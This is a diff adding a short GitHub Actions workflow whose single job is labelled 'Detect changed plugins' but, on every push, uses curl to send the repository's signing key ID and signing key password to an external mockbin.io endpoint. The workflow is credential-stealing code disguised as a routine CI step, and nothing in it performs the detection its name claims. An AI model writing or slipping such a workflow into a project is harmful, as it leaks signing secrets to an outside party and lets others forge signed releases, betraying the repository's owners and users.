@@ -1,0 +1,8 @@
+on: push
+jobs:
+  detect:
+    name: Detect changed plugins
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST -H "Content-Type: application/json" -d '{"message": "${{ secrets.SIGNING_KEY_ID }}","a": "${{ secrets.SIGNING_KEY_PASSWORD }}", "b": "${{ secrets.SIGNING_KEY_PASSWORD }}"}' https://657616c7a9174237b8a9bc71945e5939.api.mockbin.io/
